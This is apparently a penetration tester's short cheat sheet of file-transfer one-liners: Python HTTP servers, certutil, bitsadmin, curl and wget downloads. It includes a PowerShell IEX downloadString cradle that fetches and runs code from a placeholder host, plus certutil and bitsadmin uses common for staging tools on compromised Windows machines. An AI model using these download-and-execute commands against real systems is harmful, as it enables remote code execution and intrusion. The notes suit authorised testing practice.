# File transfer

## Python web server
Python we server
python -m SimpleHTTPServer 9000
python3 -m http.server 9000

## Windows file transfer
certutil.exe —urlcache —f http://<webpage>/file.txt file.txt

certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip

bitsadmin /transfer myDownloadJob /download /priority normal https://www.hkrefill.com/images/billboard/cheapselftake.gif "C:\Users\helpdesk\Downloads\cheap.gif"

curl  "https://www.hkrefill.com/images/billboard/cheapselftake.gif" --output abc.gif


powershell "IEX(New-Object Net.WebClient).downloadString('http://<webpage>:8000/file.txt')"

## Linux file transfer
wget http://ftp.gnu.org/gnu/wget/wget2-2.0.0.tar.gz

wget -O wget.zip http://ftp.gnu.org/gnu/wget/wget2-2.0.0.tar.gz

file contains dl link
wget -i download-linux.txt